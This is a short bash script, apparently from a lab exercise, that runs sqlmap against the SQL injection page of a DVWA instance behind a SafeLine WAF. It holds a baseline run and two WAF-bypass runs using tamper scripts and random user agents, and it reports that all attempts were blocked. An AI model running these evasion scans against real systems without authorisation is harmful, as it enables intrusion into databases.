#!/bin/bash
# SQL Injection testing against SafeLine WAF via sqlmap
# Target: DVWA SQL Injection page, routed through SafeLine WAF
# Requires: valid DVWA session cookie (see get_session.sh)

TARGET="http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit#"
COOKIE="PHPSESSID=<your_session_id>; security=low"

# 1. Baseline attempt — default sqlmap settings
sqlmap -u "$TARGET" \
  --cookie="$COOKIE" \
  --batch --level=3 --risk=2

# 2. Bypass attempt — space/charset obfuscation
sqlmap -u "$TARGET" \
  --cookie="$COOKIE" \
  --batch --level=3 --risk=2 \
  --tamper=space2comment,charencode --random-agent

# 3. Bypass attempt — comparison operator + keyword-case obfuscation
sqlmap -u "$TARGET" \
  --cookie="$COOKIE" \
  --batch --level=3 --risk=2 \
  --tamper=between,randomcase,space2comment --random-agent

# Result across all 3 runs: WAF fingerprinted as "SafeLine Next Gen WAF (Chaitin Tech)",
# all tested parameters returned non-injectable, majority of requests returned HTTP 403.
